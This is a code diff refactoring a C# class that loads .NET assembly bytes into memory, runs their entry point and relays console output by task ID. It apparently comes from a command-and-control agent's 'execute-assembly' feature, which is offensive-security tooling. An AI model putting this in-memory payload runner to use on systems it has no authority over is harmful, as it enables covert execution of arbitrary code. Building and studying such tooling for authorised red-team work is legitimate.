@@ -6,75 +6,83 @@ using Agent.Models;
 
 public class ConsoleApplicationExecutor
 {
-    private AssemblyLoadContext alc = new AssemblyLoadContext(Misc.RandomString(10));
-    private readonly byte[] asmBytes;
-    private readonly string[] args;
-    private readonly string task_id;
-    private readonly IMessageManager? messageManager;
-    private bool running = false;
+    private static readonly SemaphoreSlim ConsoleExecutionGate = new(1, 1);
+
+    private readonly AssemblyLoadContext loadContext = new(Misc.RandomString(10), isCollectible: true);
+    private readonly byte[] assemblyBytes;
+    private readonly string[] arguments;
+    private readonly string taskId;
+    private readonly IMessageManager messageManager;
+    private int running;
+
     public ConsoleApplicationExecutor(byte[] asmBytes, string[] args, string task_id, IMessageManager messageManager)
     {
         this.messageManager = messageManager;
-        this.asmBytes = asmBytes;
-        this.args = args;
-        this.task_id = task_id;
+        assemblyBytes = asmBytes;
+        arguments = args;
+        taskId = task_id;
     }
-    public async void Execute()
-    {
-        if(messageManager is null){
-            return;
-        }
 
-        using (var redirector = new ConsoleWriter())
+    public async Task ExecuteAsync()
+    {
+        if (Interlocked.CompareExchange(ref running, 1, 0) != 0)
+            throw new InvalidOperationException("This assembly executor is already running.");
+
+        bool gateHeld = false;
+        try
         {
-            redirector.WriteEvent += consoleWriter_WriteEvent;
-            redirector.WriteLineEvent += consoleWriter_WriteLineEvent;
-            running = true;
-            // Load the assembly
-            try
-            {
-                Assembly assembly = alc.LoadFromStream(new MemoryStream(this.asmBytes));
-                if(assembly is null){
-                    messageManager.WriteLine("Failed to find assembly.", this.task_id, true, "error");
-                    return;
-                }
+            await ConsoleExecutionGate.WaitAsync().ConfigureAwait(false);
+            gateHeld = true;
 
-                if(assembly.EntryPoint is null){
-                    messageManager.WriteLine("Failed to find entrypoint.", this.task_id, true, "error");
-                    return;
-                }
-
-                assembly.EntryPoint.Invoke(null, new object[] { this.args });
-            }
-            catch (Exception e)
-            {
-                messageManager.WriteLine(e.ToString(), this.task_id, true, "error");
-            }
-            redirector.WriteEvent -= consoleWriter_WriteEvent;
-            redirector.WriteLineEvent -= consoleWriter_WriteLineEvent;
-            running = false;
+            await Task.Run(ExecuteWithConsoleRedirectAsync).ConfigureAwait(false);
+        }
+        finally
+        {
+            if (gateHeld)
+                ConsoleExecutionGate.Release();
+            Volatile.Write(ref running, 0);
         }
     }
 
-    private void consoleWriter_WriteLineEvent(object? sender, ConsoleWriterEventArgs e)
+    private async Task ExecuteWithConsoleRedirectAsync()
     {
-        if(messageManager is null){
-            return;
+        using var redirector = new ConsoleWriter();
+        redirector.WriteEvent += ConsoleWriterOnWrite;
+        redirector.WriteLineEvent += ConsoleWriterOnWriteLine;
+        try
+        {
+            Assembly assembly = loadContext.LoadFromStream(new MemoryStream(assemblyBytes));
+            MethodInfo entryPoint = assembly.EntryPoint
+                ?? throw new InvalidOperationException("Failed to find entrypoint.");
+            object?[]? parameters = entryPoint.GetParameters().Length == 0
+                ? null
+                : new object?[] { arguments };
+            object? result = entryPoint.Invoke(null, parameters);
+            if (result is Task task)
+                await task.ConfigureAwait(false);
+
+            messageManager.WriteLine("Assembly execution complete.", taskId, true);
         }
-
-        messageManager.WriteLine(e.Value, this.task_id, false);
-    }
-
-    private void consoleWriter_WriteEvent(object? sender, ConsoleWriterEventArgs e)
-    {
-        if(messageManager is null){
-            return;
+        catch (Exception exception)
+        {
+            Exception actual = exception is TargetInvocationException { InnerException: not null }
+                ? exception.InnerException
+                : exception;
+            messageManager.WriteLine(actual.ToString(), taskId, true, "error");
         }
-        messageManager.Write(e.Value, this.task_id, false);
+        finally
+        {
+            redirector.WriteEvent -= ConsoleWriterOnWrite;
+            redirector.WriteLineEvent -= ConsoleWriterOnWriteLine;
+            loadContext.Unload();
+        }
     }
 
-    public bool IsRunning()
-    {
-        return running;
-    }
+    private void ConsoleWriterOnWriteLine(object? sender, ConsoleWriterEventArgs args) =>
+        messageManager.WriteLine(args.Value, taskId, false);
+
+    private void ConsoleWriterOnWrite(object? sender, ConsoleWriterEventArgs args) =>
+        messageManager.Write(args.Value, taskId, false);
+
+    public bool IsRunning() => Volatile.Read(ref running) != 0;
 }
